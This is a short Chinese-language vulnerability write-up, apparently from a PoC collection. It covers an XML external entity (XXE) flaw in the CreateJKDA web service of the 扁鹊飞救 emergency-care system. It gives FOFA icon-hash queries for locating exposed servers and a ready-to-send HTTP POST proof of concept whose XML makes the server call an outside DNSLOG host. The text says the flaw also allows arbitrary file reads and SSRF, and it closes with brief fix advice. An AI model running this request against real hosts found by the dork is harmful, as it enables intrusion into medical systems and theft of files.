## 扁鹊飞救智能急救与质控系统 CreateJKDA XML实体注入漏洞

## 漏洞描述
`CreateJKDA` WebService 接口允许客户端提交自定义 XML，但未禁用外部实体，攻击者可通过 `<!ENTITY>` 声明触发 XXE，读取任意文件或向内网发起 SSRF 请求。

## 资产测绘
```
fofa: icon_hash="-757866684" || icon_hash="-1206146847"
```

## POC
```
POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/CreateJKDA HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive

requestXml1=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://psrtaewbis.lfcx.eu.org">
  %remote;
]>
<root/>
```
DNSLOG 接收到请求即可确认漏洞存在。

## 修复建议
- 在解析 XML 时禁用外部实体
- 仅接受 JSON 格式或使用安全的 XML parser

